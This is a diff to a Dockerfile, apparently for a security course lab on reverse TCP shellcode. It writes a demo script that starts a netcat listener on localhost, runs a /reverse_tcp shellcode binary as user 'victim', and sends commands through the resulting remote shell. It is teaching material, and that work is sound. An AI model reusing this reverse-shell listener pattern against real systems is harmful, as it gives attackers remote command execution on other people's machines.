@@ -52,7 +52,29 @@ RUN cd /opt/ch_08/reverse_tcp \
 USER victim
 WORKDIR /home/victim
 
-COPY targets/ch_08-reversetcp/demo.sh /opt/demo.sh
-RUN chmod +x /opt/demo.sh
+# Written directly rather than COPYed, so it is owned by victim from the start.
+RUN printf '%s\n' \
+    '#!/bin/sh' \
+    'set -u' \
+    'PORT=8042' \
+    'LOG=/tmp/reverse_tcp.log' \
+    'echo "=== before ==="' \
+    'id' \
+    'echo "=== starting listener on 127.0.0.1:$PORT ==="' \
+    '(' \
+    '    sleep 2' \
+    '    printf "echo REMOTE_SHELL_RUNS_AS:\$(id -un); echo REMOTE_UID:\$(id -u); exit\n"' \
+    '    sleep 2' \
+    ') | timeout 25 nc -l -v -p "$PORT" > "$LOG" 2>&1 &' \
+    'LISTENER_PID=$!' \
+    'sleep 1' \
+    'echo "=== running reverse_tcp shellcode ==="' \
+    '/reverse_tcp' \
+    'echo "shellcode_exit=$?"' \
+    'wait "$LISTENER_PID" 2>/dev/null' \
+    'sleep 1' \
+    'echo "=== what the listener captured ==="' \
+    'cat "$LOG"' \
+    > /opt/demo.sh && chmod +x /opt/demo.sh
 
 CMD ["/opt/demo.sh"]
